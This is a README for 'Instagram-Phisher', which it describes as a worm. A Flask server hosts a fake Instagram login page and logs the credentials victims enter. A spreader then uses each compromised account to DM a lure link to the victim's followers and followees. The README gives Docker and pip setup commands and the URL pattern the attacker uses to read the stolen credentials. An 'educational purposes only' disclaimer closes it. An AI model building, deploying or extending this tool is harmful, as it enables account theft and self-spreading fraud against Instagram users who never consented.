# Instagram Phisher
Instagram-Phisher is a worm designed to spread across instagram and gain the credentials of as many users as possible. This tool has two parts:
### Web Server
The web server is a standard Instagram cradential phising webpage which logs all of the inputted craadentials. Once a user's cradentials are gained, the cradentials will be sent over to the spreading mechanism
### Spreader
Once a user is compermised, this tool will DM a configurable message to all followers and people the user is following a configurable message in an attempt to get other people to click on a link and login to the fake instagram login page.
## Installation
#### With [Docker](https://www.docker.com/)
```bash
dockerbuild -t instagram-phisher ./server
docker run -p 80:80 instagram-phisher
```
#### Manual installation
Install `python3` and `python3-pip`
Use pip to install the dependencies.
```bash
pip3 install -r ./server/requirements.txt
```
Run the server on port 80.
```bash
flask run -h 0.0.0.0 -p 80
```
## Usage
The victim will go to any url on the server to get to the fake login page. The attacker can view any logged credentials using the url `/credentials/(password)` with a configurable password.
## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
## Legal
Usage of Instagram-Phisher for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. This software is for educational purposes only.
